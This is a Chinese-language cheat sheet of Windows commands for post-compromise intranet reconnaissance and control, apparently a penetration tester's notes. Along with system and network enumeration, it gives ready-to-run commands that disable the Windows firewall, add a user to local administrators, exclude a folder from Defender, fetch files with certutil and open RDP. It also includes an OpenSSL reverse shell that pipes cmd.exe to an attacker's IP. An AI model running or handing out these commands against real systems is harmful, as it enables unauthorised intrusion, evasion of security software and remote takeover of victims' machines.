# Windows内网信息搜集

参考：
- [浅析内网信息收集](https://xz.aliyun.com/t/8291)


### 网络配置
```
ipconfig /all
```

### 操作系统信息/英文
```
systeminfo | findstr /B /C:"OS 名称" /C:"OS 版本"
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
```

### 查看杀毒软件信息
```
wmic /namespace:\\root\securitycenter2 path antivirusproduct GET displayName,productState, pathToSignedProductExe
displayName              pathToSignedProductExe                                          productState
Windows Defender         windowsdefender://                                              393488
金山毒霸铠甲防御         c:\program files (x86)\kingsoft\kingsoft antivirus\kxetray.exe  331776
金山毒霸铠甲防御         c:\program files (x86)\kingsoft\kingsoft antivirus\kxetray.exe  331776
ESET Endpoint Antivirus  C:\Program Files\ESET\ESET Endpoint Antivirus\ecmd.exe          266256
```

### 查看计划任务信息
```
schtasks  /query  /fo  LIST /v
```

### 查看用户列表
```
net user
```

### 查看当前在线用户
```
query user || qwinsta
```


### 查看端口开放信息
```
netstat –ano
```

### 查看补丁信息
```
systeminfo
```

或者
```
wmic qfe get Caption,Description,HotFixID,InstalledOn
```

### 在某目录下的某些后缀文件中查找某文件内容
```
findstr /s /n /i /c:"class WebPage" "D:\xxx\yyy\*.cs"
```
### Windows下查看IIS的各个网站的目录以及配置信息
```
appcmd list site /config
C:\Windows\SysWOW64\inetsrv\appcmd.exe list site /config
```

### 查看防火墙信息
```
netsh firewall show config
```

### 关闭防火墙
Windows server 2003系统及以前版本，命令如下：
```
netsh firewall set opmode disable
```
Windows server 2003之后系统版本，命令如下：
```
netsh advfirewall set allprofiles state off
```

### 下载文件到某目录
```
certutil.exe -urlcache -split -f "https://www.baidu.com/" C:\baidu.txt
```

### ICMP探测内网
```
for /L %I in (1,1,254) DO @ping -w 1 -n 1 192.168.85.%I | findstr "TTL="
```

### 将自己加入管理员
```
net localgroup administrators domain\username /add
```

### Defender排除某个目录：
powershell -ExecutionPolicy Bypass Add-MpPreference -ExclusionPath "C:\Users\admin\Downloads"

### Openssl.exe反弹shell：
攻击者：
```
D:\Git\usr\bin\openssl.exe req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes #生成证书
D:\Git\usr\bin\openssl.exe s_server -quiet -key key.pem -cert cert.pem -port 80 #命令输入
D:\Git\usr\bin\openssl.exe s_server -quiet -key key.pem -cert cert.pem -port 443 #命令输出
```
被控端：
```
D:\Git\usr\bin\openssl.exe s_client -quiet -connect IP:80|cmd.exe|D:\Git\usr\bin\openssl.exe s_client -quiet -connect IP:443
```

### Windows10下开启Telnet命令：

```
开启
dism /online /Enable-Feature /FeatureName:TelnetClient
关闭
dism /online /Disable-Feature /FeatureName:TelnetClient
```


### 开启RDP
```
wmic RDTOGGLE WHERE ServerName='自己的hostname' call SetAllowTSConnections 0   //先关闭rdp
netsh advfirewall firewall add rule name="RDP7" protocol=TCP dir=in localport=3389 action=allow
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\Wds\rdpwd\Tds\tcp" /v "portnumber" /t REG_DWORD /d "3389" /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v "portnumber" /t REG_DWORD /d "3389" /f
wmic RDTOGGLE WHERE ServerName='自己的hostname' call SetAllowTSConnections 1  //再开启rdp
```
